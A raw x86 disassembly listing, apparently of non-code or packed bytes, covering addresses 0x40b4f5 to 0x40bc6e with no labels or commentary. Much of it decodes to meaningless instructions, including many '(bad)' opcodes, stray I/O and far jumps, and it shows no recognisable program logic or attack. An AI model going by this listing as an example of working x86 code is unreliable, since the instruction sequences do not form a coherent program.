  40b4f5:	cmp    ecx,DWORD PTR [esi-0x5a]
  40b4f8:	add    al,BYTE PTR [edx]
  40b4fa:	add    BYTE PTR [edx+0x52],ah
  40b4fd:	xor    al,0x4f
  40b4ff:	xchg   edx,eax
  40b500:	push   edx
  40b501:	inc    ebx
  40b502:	push   esp
  40b503:	mov    eax,ds:0x6200023a
  40b508:	dec    edi
  40b509:	aas    
  40b50a:	inc    ecx
  40b50b:	mov    al,0xbf
  40b50d:	cmp    al,0x0
  40b50f:	bound  esp,QWORD PTR [ebp-0x406ab3ca]
  40b515:	cmp    DWORD PTR [eax],eax
  40b517:	bound  esi,QWORD PTR [eax-0x2f5aafc1]
  40b51d:	xor    BYTE PTR [eax],al
  40b51f:	bound  edi,QWORD PTR [ebp-0x315ebec7]
  40b525:	cmp    edx,DWORD PTR [esi+0x2b]
  40b528:	(bad)  
  40b529:	sub    eax,DWORD PTR [eax]
  40b52b:	(bad)  
  40b52c:	fldcw  WORD PTR [edx]
  40b52e:	cmp    al,0x27
  40b530:	cwde   
  40b531:	xor    dh,BYTE PTR [edi]
  40b533:	das    
  40b534:	test   edi,esp
  40b536:	add    esp,DWORD PTR [edx-0x27]
  40b539:	sbb    al,0x41
  40b53b:	adc    BYTE PTR [esp+ebp*1+0x2cd96204],dl
  40b542:	sbb    DWORD PTR [ecx],edx
  40b544:	xchg   esi,eax
  40b545:	sub    BYTE PTR [edx],dh
  40b547:	and    DWORD PTR [ecx-0x269dfc19],esp
  40b54d:	mov    ch,0x36
  40b54f:	add    BYTE PTR [esi],dh
  40b551:	mov    ds:0xd9622ca5,al
  40b556:	mov    edx,0xaa882030
  40b55b:	xor    DWORD PTR [ebx],ebp
  40b55d:	xchg   edi,eax
  40b55e:	lods   al,BYTE PTR ds:[esi]
  40b55f:	add    esp,DWORD PTR [edx-0x27]
  40b562:	xchg   esp,eax
  40b563:	xor    eax,0x32a98611
  40b568:	mov    eax,ds:0x9f41a087
  40b56d:	fnstenv [edi-0x506749bc]
  40b573:	add    esp,DWORD PTR [edx-0x27]
  40b576:	mov    bh,0x30
  40b578:	nop
  40b579:	xchg   esp,eax
  40b57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b57b:	add    esp,DWORD PTR [edx-0x27]
  40b57e:	mov    dl,BYTE PTR [esi-0x44]
  40b581:	jnp    0x40b507
  40b583:	bound  ebp,QWORD PTR [esi+0x62558682]
  40b589:	fnstenv [edi+0x51]
  40b58c:	test   DWORD PTR [ecx+0x60],esi
  40b58f:	sbb    DWORD PTR [ecx+0x7f564d7c],eax
  40b595:	js     0x40b5f2
  40b597:	pop    ebp
  40b598:	lea    edi,[ebx-0x19]
  40b59b:	add    esp,DWORD PTR [edx-0x27]
  40b59e:	dec    edx
  40b59f:	push   edi
  40b5a0:	jl     0x40b607
  40b5a2:	inc    esp
  40b5a3:	push   esi
  40b5a4:	outs   dx,BYTE PTR ds:[esi]
  40b5a5:	mov    esi,0x7b434500
  40b5aa:	gs xor eax,0x1d00d936
  40b5b0:	xor    BYTE PTR [edx+0x6e],bh
  40b5b3:	sbb    al,BYTE PTR [eax]
  40b5b5:	and    al,0x76
  40b5b7:	jb     0x40b57d
  40b5b9:	inc    edx
  40b5ba:	jnp    0x40b61d
  40b5bc:	(bad)  
  40b5bd:	adc    eax,0x660e6e82
  40b5c2:	fld    DWORD PTR [eax]
  40b5c4:	hlt    
  40b5c5:	adc    DWORD PTR [edx+esi*2+0x8],esi
  40b5c9:	add    dh,BYTE PTR [esi+0x0]
  40b5cc:	or     dh,BYTE PTR [esi]
  40b5ce:	data16 outs dx,BYTE PTR ds:[esi]
  40b5d0:	rol    BYTE PTR [edx],cl
  40b5d2:	jne    0x40b5d4
  40b5d4:	rol    BYTE PTR [edx],cl
  40b5d6:	jbe    0x40b648
  40b5d8:	add    al,0x7
  40b5da:	jge    0x40b643
  40b5dc:	xlat   BYTE PTR ds:[ebx]
  40b5dd:	add    bl,cl
  40b5df:	add    dl,cl
  40b5e1:	adc    eax,0x61c4717c
  40b5e6:	fld    DWORD PTR [eax]
  40b5e8:	or     eax,0x99009699
  40b5ed:	cwde   
  40b5ee:	xchg   esi,eax
  40b5ef:	add    BYTE PTR [esi-0x6fb99a3e],ch
  40b5f5:	lods   eax,DWORD PTR ds:[esi]
  40b5f6:	je     0x40b63f
  40b5f8:	xchg   DWORD PTR [edi-0x41838d86],ebx
  40b5fe:	gs addr16 xchg esi,eax
  40b601:	xchg   edi,eax
  40b602:	xchg   edi,eax
  40b603:	ja     0x40b5b6
  40b605:	mov    esi,0x8285647b
  40b60a:	xchg   esp,eax
  40b60b:	js     0x40b5f6
  40b60d:	popa   
  40b60e:	fld    DWORD PTR [eax]
  40b610:	cmp    ch,BYTE PTR [ebp-0x55afb99b]
  40b616:	je     0x40b65f
  40b618:	inc    edi
  40b619:	add    BYTE PTR [edx+edi*2+0x65813c72],bl
  40b620:	add    BYTE PTR [si+0x4283],dl
  40b625:	jns    0x40b65a
  40b627:	jbe    0x40b697
  40b629:	fs daa 
  40b62b:	mov    al,BYTE PTR [eax]
  40b62d:	add    BYTE PTR [ecx],ch
  40b62f:	aad    0x61
  40b631:	add    BYTE PTR [ebx-0x68ffff2a],bh
  40b637:	(bad)  
  40b638:	add    BYTE PTR [eax],al
  40b63a:	js     0x40b611
  40b63c:	arpl   WORD PTR [eax],ax
  40b63e:	js     0x40b615
  40b640:	push   0x74d6ae00
  40b645:	add    BYTE PTR [edi-0x2b],bl
  40b648:	ins    DWORD PTR es:[edi],dx
  40b649:	add    BYTE PTR [esi+edx*8-0x2a84ff92],bl
  40b650:	jb     0x40b652
  40b652:	mov    dl,0xd6
  40b654:	jbe    0x40b656
  40b656:	mov    dl,0xd6
  40b658:	ins    BYTE PTR es:[edi],dx
  40b659:	add    BYTE PTR [esi-0x61ff9a2a],ch
  40b65f:	(bad)  
  40b660:	add    BYTE PTR [eax],al
  40b662:	mov    DWORD PTR [eax+eax*2+0x0],ebp
  40b666:	or     al,0x40
  40b668:	inc    eax
  40b669:	add    BYTE PTR [esp+ebp*2],ah
  40b66c:	inc    eax
  40b66d:	add    BYTE PTR [ecx],bl
  40b66f:	mov    al,ds:0x40f00041
  40b674:	inc    eax
  40b675:	add    ah,bl
  40b677:	mov    DWORD PTR [edi+0x70],esp
  40b67a:	out    0x9a,eax
  40b67c:	jno    0x40b6ac
  40b67e:	add    bh,bl
  40b680:	sub    DWORD PTR [eax+eax*1-0x4],0xd7706789
  40b688:	call   0x7472:0x779f5371
  40b68f:	mov    es,WORD PTR [esi+0x793c0000]
  40b695:	addr16 jo 0x40b62f
  40b698:	call   0x744d:0x98625371
  40b69f:	jle    0x40b64c
  40b6a1:	dec    ebx
  40b6a2:	outs   dx,BYTE PTR ds:[esi]
  40b6a3:	bound  edi,QWORD PTR [ebx-0x408d96a0]
  40b6a9:	push   edx
  40b6aa:	gs inc ebx
  40b6ac:	lods   al,BYTE PTR ds:[esi]
  40b6ad:	pop    ebp
  40b6ae:	inc    edx
  40b6af:	dec    ebx
  40b6b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b1:	push   ebp
  40b6b2:	popa   
  40b6b3:	push   edx
  40b6b4:	mov    edx,0xa8376f52
  40b6b9:	inc    edx
  40b6ba:	dec    ecx
  40b6bb:	push   ss
  40b6bc:	mov    ch,0x41
  40b6be:	push   eax
  40b6bf:	bound  esi,QWORD PTR [ebx-0x43cd96a0]
  40b6c5:	pop    ecx
  40b6c6:	jae    0x40b6fa
  40b6c8:	fisttp DWORD PTR [edi+0x65]
  40b6cb:	sub    edx,ebp
  40b6cd:	popa   
  40b6ce:	addr16 (bad) 
  40b6d0:	inc    DWORD PTR [ecx]
  40b6d2:	add    BYTE PTR [edx+0x3b],ah
  40b6d5:	pop    esi
  40b6d6:	imul   edx,DWORD PTR [edx],0x2b745f33
  40b6dc:	adc    eax,0x34ff6763
  40b6e1:	push   esp
  40b6e2:	arpl   WORD PTR [eax],ax
  40b6e4:	std    
  40b6e5:	sbb    ebx,DWORD PTR [edi+0x72]
  40b6e8:	icebp  
  40b6e9:	dec    esi
  40b6ea:	pop    ebx
  40b6eb:	jp     0x40b6b4
  40b6ed:	repnz add DWORD PTR [eax],eax
  40b6f0:	bound  edi,QWORD PTR [edi]
  40b6f2:	pop    esi
  40b6f3:	imul   edx,edx,0x9b745f37
  40b6f9:	push   ebp
  40b6fa:	arpl   WORD PTR [edi-0x39],sp
  40b6fd:	xor    eax,0x5ec56354
  40b702:	pop    edi
  40b703:	jb     0x40b6b6
  40b705:	repnz add DWORD PTR [eax],eax
  40b708:	bound  edi,QWORD PTR [edi]
  40b70a:	pop    esi
  40b70b:	imul   edx,DWORD PTR [edx+0x7f766343],0x85615739
  40b715:	(bad)  [eax+ebx*2+0x75]
  40b719:	mov    WORD PTR [ebx+0x36],ss
  40b71c:	xchg   DWORD PTR [edx+0x44],edi
  40b71f:	add    al,0x62
  40b721:	fst    DWORD PTR [eax+ebp*4-0x41ce3978]
  40b728:	ss sahf 
  40b72a:	pop    ebx
  40b72b:	loope  0x40b76b
  40b72d:	sub    al,0x19
  40b72f:	or     DWORD PTR [ebp+0x6606e8f4],edi
  40b735:	fldcw  WORD PTR [edi]
  40b737:	add    al,0x62
  40b739:	(bad)  
  40b73b:	add    esp,DWORD PTR [edx-0x27]
  40b73e:	out    0x3,eax
  40b740:	(bad)  
  40b741:	(bad)  
  40b743:	add    esp,DWORD PTR [edx-0x27]
  40b746:	out    0x3,eax
  40b748:	add    BYTE PTR [edx-0x27],ah
  40b74b:	out    0x3,eax
  40b74d:	(bad)  
  40b74e:	(bad)  
  40b750:	add    esp,DWORD PTR [edx-0x27]
  40b753:	out    0x3,eax
  40b755:	(bad)  
  40b756:	(bad)  
  40b758:	add    esp,DWORD PTR [edx-0x27]
  40b75b:	out    0x3,eax
  40b75d:	(bad)  
  40b75e:	(bad)  
  40b760:	add    esp,DWORD PTR [edx-0x27]
  40b763:	out    0x3,eax
  40b765:	(bad)  
  40b766:	(bad)  
  40b768:	add    esp,DWORD PTR [edx-0x27]
  40b76b:	out    0x3,eax
  40b76d:	(bad)  
  40b76e:	(bad)  
  40b770:	add    esp,DWORD PTR [edx-0x27]
  40b773:	mov    ds:0xe7d9a623,eax
  40b778:	add    esp,DWORD PTR [edx-0x27]
  40b77b:	out    0x3,eax
  40b77d:	(bad)  
  40b77e:	fnstcw WORD PTR [eax+0x628e9154]
  40b784:	xor    BYTE PTR [esi-0x26a56233],al
  40b78a:	loope  0x40b77a
  40b78c:	jp     0x40b73c
  40b78e:	fld    DWORD PTR [eax]
  40b790:	add    DWORD PTR [edi-0x2616fd8e],ecx
  40b796:	fwait
  40b797:	and    al,0x5
  40b799:	and    ebp,ecx
  40b79b:	and    bl,bh
  40b79d:	mov    eax,ds:0xe4bb31d9
  40b7a2:	js     0x3818b1dd
  40b7a8:	push   ds
  40b7a9:	push   esi
  40b7aa:	outs   dx,DWORD PTR ds:[esi]
  40b7ab:	pop    ebx
  40b7ac:	jae    0x40b7ae
  40b7ae:	and    eax,0xa6fa1cbd
  40b7b3:	push   eax
  40b7b4:	dec    ebp
  40b7b5:	add    eax,0xed76546a
  40b7ba:	pop    esp
  40b7bb:	jmp    0x5f0d:0xa27ae738
  40b7c2:	mov    eax,ds:0x19e3749f
  40b7c7:	outs   dx,BYTE PTR ds:[esi]
  40b7c8:	sub    al,0x13
  40b7ca:	dec    esi
  40b7cb:	push   esi
  40b7cc:	inc    esp
  40b7cd:	icebp  
  40b7ce:	int3   
  40b7cf:	fsubr  QWORD PTR [edx-0x13]
  40b7d2:	repnz pushf 
  40b7d4:	add    al,0x19
  40b7d6:	repz popf 
  40b7d8:	(bad)  
  40b7d9:	mov    eax,0xf760cca0
  40b7de:	and    ecx,ebx
  40b7e0:	sub    DWORD PTR ds:0xf3d8f065,0x6dc0e5a1
  40b7ea:	mov    eax,ds:0xad72686c
  40b7ef:	mov    ebp,0xbdad6214
  40b7f4:	adc    BYTE PTR [ebx-0x5b],ah
  40b7f7:	mov    ebp,0x19dcab1c
  40b7fc:	sbb    eax,0x10bd9570
  40b801:	pusha  
  40b802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b803:	mov    ebp,0xd188d214
  40b808:	jb     0x40b80a
  40b80a:	mov    ds,WORD PTR [edx+0x7a]
  40b80d:	and    al,0x2b
  40b80f:	fisttp DWORD PTR ds:0xdaba0085
  40b815:	add    BYTE PTR [eax],al
  40b817:	jp     0x40b7b4
  40b819:	or     al,dl
  40b81b:	hlt    
  40b81c:	fiadd  DWORD PTR [eax]
  40b81e:	jb     0x40b812
  40b820:	push   ebp
  40b821:	pop    es
  40b822:	push   0xb
  40b824:	push   esi
  40b825:	iret   
  40b826:	jmp    FWORD PTR [ebx]
  40b828:	ror    DWORD PTR [ecx-0x76226ef9],1
  40b82e:	iret   
  40b82f:	sbb    al,0x8e
  40b831:	or     al,0x8b
  40b833:	sbb    ebx,DWORD PTR [ebp-0x4]
  40b836:	call   DWORD PTR [edi+0x5ff669a8]
  40b83c:	fdiv   QWORD PTR [ebp+0x4]
  40b83f:	push   edi
  40b840:	mov    al,0x8a
  40b842:	inc    esp
  40b843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b844:	(bad)  
  40b845:	mov    BYTE PTR [esi],al
  40b847:	mov    WORD PTR [eax-0x43],fs
  40b84a:	dec    eax
  40b84b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84c:	fmul   DWORD PTR [eax+0x75]
  40b84f:	dec    ebp
  40b850:	mov    bh,0x10
  40b852:	lea    eax,[esi-0x2b]
  40b855:	jmp    0x18cbb893
  40b85a:	add    DWORD PTR [edx],0x18
  40b85d:	jne    0x40b863
  40b85f:	fcmovnu st,st(2)
  40b861:	jmp    0x24d9c3ad
  40b866:	and    BYTE PTR [ebx-0x51],bh
  40b869:	mov    esi,DWORD PTR ds:[ebp+0x375e87ce]
  40b870:	cmc    
  40b871:	aad    0x81
  40b873:	nop
  40b874:	mov    ebp,0x3b0000ea
  40b879:	lods   eax,DWORD PTR ds:[esi]
  40b87a:	and    eax,0x87dafa8d
  40b87f:	inc    esi
  40b880:	arpl   WORD PTR [esi+esi*8+0xa],bx
  40b884:	bound  eax,QWORD PTR [esi-0x1b]
  40b887:	sbb    BYTE PTR [eax+ebp*8+0x4a0eeac0],0x6
  40b88f:	lea    esp,[edi-0x6372ae04]
  40b895:	icebp  
  40b896:	push   ecx
  40b897:	push   DWORD PTR [edi+0x54]
  40b89a:	sbb    BYTE PTR [eax+0x62],al
  40b89d:	jae    0x40b864
  40b89f:	or     ebp,ebx
  40b8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a2:	sbb    bh,al
  40b8a4:	pushf  
  40b8a5:	call   0xf0a2b8ac
  40b8aa:	repz mov edi,0x5b5dbe85
  40b8b0:	cmp    edi,DWORD PTR [ecx-0x3c9df83a]
  40b8b6:	push   ebp
  40b8b7:	push   esi
  40b8b8:	fldcw  WORD PTR [ebx+0x1b910fe8]
  40b8be:	sub    BYTE PTR [ebx-0x74a70d84],al
  40b8c4:	mov    ebx,0x918aeec4
  40b8c9:	xchg   esp,eax
  40b8ca:	bound  esi,QWORD PTR [edx+ebp*2-0x5f48eeff]
  40b8d1:	push   0xd
  40b8d3:	(bad)
  40b8d6:	inc    esp
  40b8d7:	add    cl,bl
  40b8d9:	sti    
  40b8da:	(bad)  
  40b8db:	scas   eax,DWORD PTR es:[edi]
  40b8dc:	add    BYTE PTR [eax+esi*1],dl
  40b8df:	add    dh,BYTE PTR [ebx]
  40b8e1:	scas   eax,DWORD PTR es:[edi]
  40b8e2:	rcl    BYTE PTR [edx+0x4],cl
  40b8e5:	xor    DWORD PTR [ebp-0x11093f04],esi
  40b8eb:	inc    ebx
  40b8ec:	data16 loope 0x40b888
  40b8ef:	pop    ss
  40b8f0:	jb     0x40b931
  40b8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8f3:	xor    eax,0xd0777a24
  40b8f8:	push   ebp
  40b8f9:	cmp    bh,BYTE PTR [ebx-0x41]
  40b8fc:	inc    BYTE PTR [ebp-0x26]
  40b8ff:	imul   eax,ebx,0xffffffb1
  40b902:	fcomp  st(2)
  40b904:	fsub   QWORD PTR [eax-0x27a14a7c]
  40b90a:	sbb    BYTE PTR [ebx-0x6226a23b],dh
  40b910:	mov    WORD PTR [edx],ss
  40b912:	lea    esi,[edx+0x59]
  40b915:	push   0xffffff97
  40b917:	adc    ch,0x69
  40b91a:	push   esi
  40b91b:	sahf   
  40b91c:	pop    es
  40b91d:	cli    
  40b91e:	mov    WORD PTR [ebp+0x2],es
  40b921:	bound  ebx,QWORD PTR [ebp-0x58]
  40b924:	cmp    DWORD PTR [edi+0x58],ebx
  40b927:	mov    al,ds:0x6ab2f8bf
  40b92c:	inc    eax
  40b92d:	ds aad 0xe7
  40b930:	aaa    
  40b931:	jnp    0x40b983
  40b933:	es or  al,0x49
  40b936:	sbb    esp,edx
  40b938:	add    ah,BYTE PTR [ebx*8+0x6dc52041]
  40b93f:	retf   
  40b940:	adc    eax,DWORD PTR [eax]
  40b942:	adc    ah,ah
  40b944:	hlt    
  40b945:	pop    edi
  40b946:	dec    esp
  40b947:	cdq    
  40b948:	out    0x82,eax
  40b94a:	mov    eax,ds:0x5a4662d5
  40b94f:	push   esi
  40b950:	xor    BYTE PTR ds:0x5eef93eb,al
  40b956:	xor    al,0x17
  40b958:	in     al,dx
  40b959:	add    esi,DWORD PTR [eax+edx*2]
  40b95c:	jns    0x40b8e9
  40b95e:	pop    ss
  40b95f:	fisttp QWORD PTR [edi-0x7a]
  40b962:	pop    ds
  40b963:	xlat   BYTE PTR ds:[ebx]
  40b964:	out    0x82,eax
  40b966:	(bad)  
  40b967:	fsubr  st(7),st
  40b969:	add    BYTE PTR [edi],0xd1
  40b96c:	out    0x5d,eax
  40b96e:	mov    eax,ds:0xe8b5728b
  40b973:	xchg   esp,eax
  40b974:	add    ecx,DWORD PTR [ecx+ebp*8]
  40b977:	call   0xc21d:0x1278e100
  40b97e:	and    eax,eax
  40b980:	push   ebp
  40b981:	je     0x40b9ff
  40b983:	fld    QWORD PTR [ecx]
  40b985:	out    dx,al
  40b986:	pusha  
  40b987:	fdivr  QWORD PTR [ecx]
  40b989:	out    0x73,al
  40b98b:	rcl    BYTE PTR [eax+0x5c],1
  40b98e:	pop    ebp
  40b990:	call   0x118762b
  40b995:	adc    ah,BYTE PTR [eax-0x59]
  40b998:	shr    BYTE PTR [ebp+0x26],0x68
  40b99c:	adc    dh,ch
  40b99e:	xchg   edi,eax
  40b99f:	ror    DWORD PTR [ecx-0x2d8f91c1],1
  40b9a5:	std    
  40b9a6:	add    al,ch
  40b9a8:	adc    ch,cl
  40b9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ab:	adc    bh,0x0
  40b9ae:	test   BYTE PTR cs:[edi],dl
  40b9b1:	add    eax,0x2487e8e9
  40b9b6:	in     eax,0xd8
  40b9b8:	mov    BYTE PTR [eax],cl
  40b9ba:	cmp    bl,BYTE PTR [edx+edx*2+0x50]
  40b9be:	loope  0x40ba38
  40b9c0:	pop    es
  40b9c1:	sbb    eax,0xe8d7a66a
  40b9c6:	pop    ebx
  40b9c7:	inc    edx
  40b9c8:	xlat   BYTE PTR ds:[ebx]
  40b9c9:	add    BYTE PTR [ebx+0x25f6d965],ch
  40b9cf:	mov    edx,0xe91effd7
  40b9d4:	call   0x5aeea19e
  40b9d9:	inc    ecx
  40b9da:	jmp    0xe3299834
  40b9df:	daa    
  40b9e0:	xlat   BYTE PTR ds:[ebx]
  40b9e1:	add    BYTE PTR [edx-0x59],dh
  40b9e4:	test   edx,eax
  40b9e6:	in     eax,0x61
  40b9e8:	mov    ecx,DWORD PTR [ecx+0x47561458]
  40b9ee:	in     eax,0x11
  40b9f0:	in     al,0x13
  40b9f2:	add    BYTE PTR [ebx-0x39],dh
  40b9f5:	inc    eax
  40b9f6:	add    al,dl
  40b9f8:	push   ds
  40b9f9:	test   edi,edi
  40b9fb:	push   cs
  40b9fc:	rol    DWORD PTR [ebx-0x7630f00a],cl
  40ba02:	push   ss
  40ba03:	rcr    ebp,1
  40ba05:	mov    esi,ecx
  40ba07:	push   esp
  40ba08:	enter  0xc789,0x0
  40ba0c:	hlt    
  40ba0d:	test   cl,al
  40ba0f:	push   esi
  40ba10:	add    al,0x6c
  40ba12:	lock push edi
  40ba14:	nop
  40ba15:	and    BYTE PTR [ebx],dh
  40ba17:	rcr    al,0x8
  40ba1a:	fs cmp edi,edi
  40ba1d:	and    eax,ebx
  40ba1f:	dec    edi
  40ba20:	mov    ebx,0x702471d6
  40ba25:	shl    ebx,1
  40ba27:	fadd   QWORD PTR [ebp+ebx*4+0x0]
  40ba2b:	bswap  esp
  40ba2d:	js     0x229bd37
  40ba33:	cmc    
  40ba34:	add    edx,DWORD PTR [ebp+0x18d90040]
  40ba3a:	inc    eax
  40ba3b:	mov    BYTE PTR [edi-0x50c49c21],bh
  40ba41:	sub    ebx,eax
  40ba43:	dec    edi
  40ba44:	mov    ebx,ebp
  40ba46:	jb     0x40ba24
  40ba48:	les    ebp,FWORD PTR [ebp+0x1]
  40ba4b:	cmc    
  40ba4c:	icebp  
  40ba4d:	xchg   esp,eax
  40ba4e:	inc    eax
  40ba4f:	add    ch,bh
  40ba51:	sar    DWORD PTR [eax],1
  40ba53:	add    BYTE PTR [ebx+eax*4-0x3f],al
  40ba57:	push   ebx
  40ba58:	ins    DWORD PTR es:[edi],dx
  40ba59:	aam    0xb5
  40ba5b:	icebp  
  40ba5c:	ins    BYTE PTR es:[edi],dx
  40ba5d:	call   0x5034ee1f
  40ba62:	fsub   DWORD PTR [esi+0x40]
  40ba65:	shl    ebx,1
  40ba67:	fcmovb st,st(4)
  40ba69:	xchg   esi,eax
  40ba6a:	add    BYTE PTR [ebx+0x62],dh
  40ba6d:	les    eax,FWORD PTR [edi-0x4b90fffd]
  40ba73:	dec    ebx
  40ba74:	inc    eax
  40ba75:	(bad)  
  40ba76:	jmp    0x40baec
  40ba78:	(bad)  
  40ba79:	mov    esp,0x720b7bf3
  40ba7e:	sti    
  40ba7f:	jae    0x40ba84
  40ba81:	dec    edi
  40ba82:	enter  0x404b,0x62
  40ba86:	push   edx
  40ba87:	icebp  
  40ba88:	(bad)  
  40ba89:	mov    esp,0x2db7ccff
  40ba8e:	lock add DWORD PTR [eax],eax
  40ba91:	mov    esp,0x8446ca0f
  40ba96:	imul   edx,DWORD PTR [eax],0xfe177c53
  40ba9c:	hlt    
  40ba9d:	sub    BYTE PTR [ebx],bh
  40ba9f:	inc    edx
  40baa0:	add    BYTE PTR [eax+0x66b70bc4],dl
  40baa6:	add    eax,0xf0a24ed8
  40baab:	pop    esp
  40baac:	xor    ebx,DWORD PTR [ebx]
  40baae:	stos   BYTE PTR es:[edi],al
  40baaf:	mov    DWORD PTR es:[esi-0x51],edx
  40bab3:	push   edi
  40bab4:	ret    
  40bab5:	xor    edi,DWORD PTR [edi+0x29b93356]
  40babb:	pop    es
  40babc:	rcl    BYTE PTR [esi-0x4c],0x4
  40bac0:	add    DWORD PTR ds:0x8d74b277,ebp
  40bac6:	jnp    0x40bb05
  40bac8:	je     0x40bae8
  40baca:	lock push esp
  40bacc:	call   DWORD PTR [edi-0x44]
  40bacf:	adc    al,BYTE PTR [eax+0x62]
  40bad2:	nop
  40bad3:	shl    DWORD PTR [ebx+0x0],0x26
  40bad7:	lock imul eax,DWORD PTR [eax],0x10dff0f
  40bade:	fisttp DWORD PTR [esi+ecx*2]
  40bae1:	jae    0x40bb01
  40bae3:	lock mov bl,BYTE PTR [esi+eiz*4]
  40bae7:	fcomp  st(3)
  40bae9:	inc    edi
  40baea:	bound  esi,QWORD PTR [edi]
  40baec:	sub    BYTE PTR [edi],dh
  40baee:	fnstcw WORD PTR es:[esi-0x666b144]
  40baf5:	inc    ebx
  40baf6:	bound  esi,QWORD PTR [edx+edi*1-0x527070c9]
  40bafd:	aaa    
  40bafe:	jp     0x40ba8f
  40bb00:	mov    ebx,0xd765941f
  40bb05:	dec    ebp
  40bb06:	ins    DWORD PTR es:[edi],dx
  40bb07:	push   esi
  40bb08:	xor    BYTE PTR [ebx],al
  40bb0a:	(bad)  
  40bb0b:	fstp   DWORD PTR [esi-0x2d]
  40bb0e:	push   edi
  40bb0f:	cdq    
  40bb10:	out    0x29,eax
  40bb12:	jle    0x40bb08
  40bb14:	leave  
  40bb15:	jl     0x40bb34
  40bb17:	enter  0x3a7,0x88
  40bb1b:	mov    dh,0x12
  40bb1d:	sbb    cl,ch
  40bb1f:	jmp    0x73a2ff01
  40bb24:	mov    edi,0xf8206da8
  40bb29:	adc    ah,BYTE PTR [edx-0x6e7ae27]
  40bb2f:	fcom   DWORD PTR [esi-0x1866b05c]
  40bb35:	sub    eax,0x37343a78
  40bb3a:	add    BYTE PTR [esi],bl
  40bb3c:	fstp   DWORD PTR ds:0xb70ee151
  40bb42:	add    DWORD PTR ds:0x222bfb67,0xb5042844
  40bb4c:	(bad)  
  40bb4d:	retf   
  40bb4e:	adc    eax,0xc46cd922
  40bb53:	xor    ecx,eax
  40bb55:	call   FWORD PTR [ebx-0x7]
  40bb58:	cdq    
  40bb59:	out    0x53,eax
  40bb5b:	xchg   ebp,eax
  40bb5c:	(bad)  
  40bb5d:	mov    bh,0x15
  40bb5f:	and    bl,cl
  40bb61:	add    BYTE PTR [esi+ebx*4-0x31],ch
  40bb65:	inc    esp
  40bb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb67:	add    eax,0x61ad7194
  40bb6c:	hlt    
  40bb6d:	add    ecx,DWORD PTR [eax-0x16bb93e6]
  40bb73:	fs adc eax,0x56a3d55c
  40bb79:	sar    DWORD PTR [ebp+0x54d4e9f],0x5a
  40bb80:	mov    dl,BYTE PTR [ecx-0x3f]
  40bb83:	popa   
  40bb84:	leave  
  40bb85:	add    cl,ch
  40bb87:	nop
  40bb88:	loopne 0x40bb5a
  40bb8a:	ins    BYTE PTR es:[edi],dx
  40bb8b:	push   ds
  40bb8c:	gs dec eax
  40bb8e:	push   ds
  40bb8f:	jb     0x40bb46
  40bb91:	or     al,0x62
  40bb93:	call   0xda:0x62531cb5
  40bb9a:	jmp    0xe88e3668
  40bb9f:	add    BYTE PTR [ecx+0x54],ah
  40bba2:	icebp  
  40bba3:	div    BYTE PTR ds:0x52ee0cb5
  40bba9:	and    DWORD PTR [edi],edx
  40bbab:	sub    DWORD PTR [esi+0x56],ebx
  40bbae:	not    DWORD PTR [eax+eax*1-0x21]
  40bbb2:	je     0x40bbc1
  40bbb4:	inc    esi
  40bbb5:	loopne 0x40bbca
  40bbb7:	mov    ch,0x74
  40bbb9:	cdq    
  40bbba:	add    BYTE PTR [ecx+0x5e],bh
  40bbbd:	hlt    
  40bbbe:	sbb    bh,BYTE PTR [esi+0x6818b57d]
  40bbc4:	fild   QWORD PTR ds:0x518c61e9
  40bbcb:	aas    
  40bbcc:	or     eax,0x550513e0
  40bbd1:	cdq    
  40bbd2:	add    BYTE PTR [ecx+eiz*4-0xe],ch
  40bbd6:	fcomp  st(3)
  40bbd8:	mov    eax,ds:0x40005e7e
  40bbdd:	jle    0x40bba1
  40bbdf:	or     BYTE PTR [ebx-0x7c],bh
  40bbe2:	dec    edi
  40bbe3:	push   ebx
  40bbe4:	mov    dx,WORD PTR [ebp-0x75]
  40bbe8:	(bad)  
  40bbe9:	call   FWORD PTR [ecx]
  40bbeb:	push   0xffffff9f
  40bbed:	dec    esi
  40bbee:	fmul   DWORD PTR [ebx-0x7c7bf6]
  40bbf4:	xchg   ebx,edx
  40bbf6:	cmp    WORD PTR [edx+ebp*4+0x1],ax
  40bbfb:	add    DWORD PTR [esp+edx*8+0x5f3cf683],0xffffffdd
  40bc03:	add    BYTE PTR [eax],al
  40bc05:	cmp    ebx,ebx
  40bc07:	mov    ebx,ecx
  40bc09:	mov    ds:0x4b014b6a,eax
  40bc0e:	push   eax
  40bc0f:	out    0x81,al
  40bc11:	dec    esi
  40bc12:	fiadd  WORD PTR [eax]
  40bc14:	add    BYTE PTR [ebx],bh
  40bc16:	aam    0x81
  40bc18:	retf   
  40bc19:	or     ebx,ebx
  40bc1b:	add    BYTE PTR [ebx+0x4e9b324c],cl
  40bc21:	cli    
  40bc22:	fimul  DWORD PTR [ecx+0x249682c8]
  40bc28:	adc    BYTE PTR [edx+0xb01021d],cl
  40bc2e:	fisttp DWORD PTR ds:0xd5c983
  40bc34:	add    BYTE PTR [esi+0x36],dh
  40bc37:	jne    0x40bc41
  40bc39:	inc    esi
  40bc3a:	adc    cl,BYTE PTR [edi]
  40bc3c:	test   ch,ah
  40bc3e:	aad    0x0
  40bc40:	add    BYTE PTR [esi+0x12],al
  40bc43:	jne    0x40bc6f
  40bc45:	shl    BYTE PTR ds:0xd91e1372,1
  40bc4b:	imul   eax,DWORD PTR [edx],0xffffffcb
  40bc4e:	fiadd  DWORD PTR [eax]
  40bc50:	push   eax
  40bc51:	push   0x6215fd8b
  40bc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc57:	adc    al,BYTE PTR [eax+0x62]
  40bc5a:	jae    0x40bc1c
  40bc5c:	or     ebp,DWORD PTR [edi+edx*2]
  40bc5f:	push   cs
  40bc60:	aam    0x71
  40bc62:	mov    al,0x4
  40bc64:	mov    edx,DWORD PTR [eax+ebx*2+0x63004e51]
  40bc6b:	lock xchg BYTE PTR [ebx],al
  40bc6e:	sbb    al,0x8b
